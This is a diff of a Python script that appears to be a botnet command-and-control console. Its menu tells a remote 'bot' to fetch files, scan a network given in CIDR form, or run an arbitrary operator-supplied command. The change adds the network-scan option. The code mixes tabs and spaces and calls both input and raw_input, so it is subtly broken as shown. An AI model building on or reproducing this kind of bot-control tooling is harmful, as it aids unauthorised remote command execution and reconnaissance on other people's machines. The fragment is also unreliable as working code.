@@ -1,6 +1,7 @@
 import socket
 import threading
 import subprocess
+import sys
 from xml.dom import minidom
 
 bind_host = '0.0.0.0'
@@ -201,7 +202,7 @@ def get_file(the_file):
 
         print('[*-->file get')
         print('>>> ')
-
+		
 
 # ---------- END FUNCTIONS ---------- #
 
@@ -269,13 +270,15 @@ while True:
         # TODO MAKE THIS WORK
 
     elif select == 4:  # Tell bot to Scan network
-        print('scanning')
-        # TODO MAKE THIS WORK
+        #Prompt the user to input a network address
+		net_id = input("Enter a network address in CIDR format, enclosed with quotes (ex.: '192.168.1.0/24'): ")
+		#send network ID to bot to use locally
+        send_cmd(do_scan(net_id))
 
     elif select == 5:  # Tell bot to run a command
         cmd_to_run = raw_input('The CMD >>> \n')
         send_cmd(cmd_to_run)
-
+		
     elif select == 6:  # Exit the Script
         end()
 
